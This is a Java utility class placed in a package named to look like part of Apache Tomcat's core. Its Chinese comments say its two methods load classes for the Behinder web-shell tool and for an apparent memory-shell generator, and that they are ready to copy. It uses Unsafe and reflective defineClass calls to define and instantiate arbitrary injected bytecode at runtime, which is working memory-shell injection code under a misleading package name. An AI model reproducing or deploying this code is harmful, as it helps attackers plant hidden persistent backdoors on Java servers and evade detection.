package org.apache.catalina.core.utils;

import javassist.ClassPool;

import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.lang.reflect.InvocationTargetException;

public class Util {
    //名字是随便取的 苯人英语不好
    //这两个方法一个用于反序列化加载冰蝎的类，一个用于加载JMG的类 可以直接搬走

    public static Class extendClassLoader(byte[] c) throws NoSuchMethodException, NoSuchFieldException, IllegalAccessException, InvocationTargetException {
        java.lang.reflect.Field f = sun.misc.Unsafe.class.getDeclaredField("theUnsafe");
        java.lang.reflect.Method m=sun.misc.Unsafe.class.getDeclaredMethod("defineAnonymousClass", new Class[]{Class.class, byte[].class, Object[].class});
        f.setAccessible(true);
        m.setAccessible(true); //全部可访问
        return (Class)m.invoke(f.get(null),new Object[]{java.io.File.class, c, null}); //执行方法 主要是为了不new一个对象
    }

    public static Class abstractClassLoader(byte[] c) throws NoSuchMethodException, SecurityException, ClassNotFoundException, IllegalAccessException, IllegalArgumentException, InvocationTargetException, InstantiationException, IOException {
        //加载class的情况，需要先获取类名再加载
        ClassPool cp =ClassPool.getDefault();
        String cName=cp.makeClass(new ByteArrayInputStream(c)).getName();
        System.out.println(cName); //原始！
        ClassLoader clzLoader = Thread.currentThread().getContextClassLoader();
        java.lang.reflect.Method defineClzMethod = clzLoader.loadClass("java.lang.ClassLoader").getDeclaredMethod("defineClass", String.class, byte[].class, Integer.TYPE, Integer.TYPE);
        defineClzMethod.setAccessible(true);
        Class clz = (Class) defineClzMethod.invoke(clzLoader, cName, c, 0, Integer.valueOf(c.length));
        clz.newInstance();
        return clz;
    }

}
